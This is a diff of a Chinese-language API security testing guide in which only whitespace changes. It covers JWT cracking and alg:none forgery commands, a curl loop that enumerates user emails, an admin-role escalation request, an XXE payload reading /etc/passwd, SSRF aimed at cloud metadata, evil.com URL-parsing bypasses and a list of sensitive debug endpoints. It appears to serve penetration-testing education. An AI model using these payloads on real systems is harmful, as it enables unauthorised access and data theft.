@@ -51,17 +51,17 @@ ew0KICAiYWxnIjogIm5vbmUiLA0KICAidHlwIjogIkpXVCI...
 # - 如果服务器用公钥验证HS256 → 签名通过！
 
 # 3. 弱密钥暴力破解
-hashcat -m 16500 jwt.txt rockyou.txt  # JWT HS256破解
+hashcat -m 16500 jwt.txt rockyou.txt # JWT HS256破解
 ```
 
 ### JWT攻击工具
 
 ```bash
 # jwt_tool.py
-python3 jwt_tool.py <jwt>                  # 分析JWT
-python3 jwt_tool.py <jwt> -T               # 篡改测试
-python3 jwt_tool.py <jwt> -X a             # alg:none攻击
-python3 jwt_tool.py <jwt> -X s             # 签名攻击
+python3 jwt_tool.py <jwt> # 分析JWT
+python3 jwt_tool.py <jwt> -T # 篡改测试
+python3 jwt_tool.py <jwt> -X a # alg:none攻击
+python3 jwt_tool.py <jwt> -X s # 签名攻击
 python3 jwt_tool.py <jwt> -X k -pk key.pem # 密钥混淆
 
 # jwt-cracker (暴力破解JWT密钥)
@@ -85,8 +85,8 @@ npx jwt-cracker 'eyJ...' 'abcdefghijklmnopqrstuvwxyz' 6
 ```bash
 # 枚举用户
 for i in $(seq 1 1000); do
-  curl -H "Authorization: Bearer $TOKEN" \
-    "https://target.com/api/users/$i" | jq '.email'
+ curl -H "Authorization: Bearer $TOKEN" \
+ "https://target.com/api/users/$i" | jq '.email'
 done
 ```
 
@@ -95,14 +95,14 @@ done
 ```bash
 # 普通用户尝试管理员端点
 curl -H "Authorization: Bearer $USER_TOKEN" \
-  https://target.com/api/admin/users  # ← 普通用户访问管理API
+ https://target.com/api/admin/users # ← 普通用户访问管理API
 
 # 如果返回200 → 垂直越权
 
 # 通过参数提升
 curl -X POST https://target.com/api/profile \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  -d '{"role":"admin"}'  # ← 尝试修改自己的角色
+ -H "Authorization: Bearer $USER_TOKEN" \
+ -d '{"role":"admin"}' # ← 尝试修改自己的角色
 ```
 
 ## 四、数据泄露与过度暴露
@@ -112,18 +112,18 @@ curl -X POST https://target.com/api/profile \
 ```json
 // 登录成功响应
 {
-  "message": "Login successful",
-  "user": {
-    "id": 1,
-    "username": "admin",
-    "passwordHash": "$2b$10$...",  // ← 密码Hash不应返回！
-    "resetToken": "abc123def456",    // ← 重置Token不应暴露
-    "ssn": "123-45-6789",           // ← SSN不应返回
-    "role": "admin",
-    "apiKeys": {
-      "stripe": "sk_live_xxxx"       // ← API密钥不应暴露
-    }
-  }
+ "message": "Login successful",
+ "user": {
+ "id": 1,
+ "username": "admin",
+ "passwordHash": "$2b$10$...", // ← 密码Hash不应返回！
+ "resetToken": "abc123def456", // ← 重置Token不应暴露
+ "ssn": "123-45-6789", // ← SSN不应返回
+ "role": "admin",
+ "apiKeys": {
+ "stripe": "sk_live_xxxx" // ← API密钥不应暴露
+ }
+ }
 }
 ```
 
@@ -132,13 +132,13 @@ curl -X POST https://target.com/api/profile \
 ```
 # 常见debug模式端点
 /api/debug/pprof
-/actuator              # Spring Boot Actuator
-/actuator/env          # 环境变量（含密钥）
-/actuator/heapdump     # 内存dump
+/actuator # Spring Boot Actuator
+/actuator/env # 环境变量（含密钥）
+/actuator/heapdump # 内存dump
 /api/debug/vars
-/info                  # 应用版本信息
-/.env                  # 环境文件
-/phpinfo.php           # PHP信息
+/info # 应用版本信息
+/.env # 环境文件
+/phpinfo.php # PHP信息
 ```
 
 ## 五、API注入攻击
@@ -174,10 +174,10 @@ Content-Type: application/xml
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+ <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <user>
-  <name>&xxe;</name>
+ <name>&xxe;</name>
 </user>
 ```
 
@@ -193,8 +193,8 @@ POST /api/webhooks
 
 不要直接给公网URL！
 先尝试 → AWS元数据端点 (169.254.169.254)
-         内网服务端口
-         本地文件系统 (file:///etc/passwd)
+ 内网服务端口
+ 本地文件系统 (file:///etc/passwd)
 ```
 
 ### Webhook请求走私
@@ -204,8 +204,8 @@ POST /api/webhooks
 
 输入：https://trusted.com/user/upload
 实际：https://trusted.com/user/upload#@evil.com
-      https://trusted.com.evil.com/phishing
-      https://trusted.com@evil.com
+ https://trusted.com.evil.com/phishing
+ https://trusted.com@evil.com
 ```
 
 ## 七、API安全测试工具链
@@ -239,11 +239,11 @@ newman run api_tests.postman_collection.json
 
 # 3. API Fuzzing
 ffuf -request api_request.txt -w fuzz_params.txt \
-  -mode clusterbomb
+ -mode clusterbomb
 
 # 4. JWT测试
 python3 jwt_tool.py -t https://target.com/api -rh "Authorization: Bearer JWT" \
-  -M at -cv "Welcome" -T
+ -M at -cv "Welcome" -T
 ```
 
 ### CI/CD中的API测试
@@ -251,12 +251,12 @@ python3 jwt_tool.py -t https://target.com/api -rh "Authorization: Bearer JWT" \
 ```yaml
 # GitHub Actions 示例
 - name: API Security Scan
-  run: |
-    # OWASP ZAP API Scan
-    zap-api-scan.py -t openapi.json -f openapi -r zap_report.html
-    
-    # 自定义JWT检查
-    python3 check_jwt.py --url https://staging.target.com/api
+ run: |
+ # OWASP ZAP API Scan
+ zap-api-scan.py -t openapi.json -f openapi -r zap_report.html
+ 
+ # 自定义JWT检查
+ python3 check_jwt.py --url https://staging.target.com/api
 ```
 
 ## 八、红队视角总结
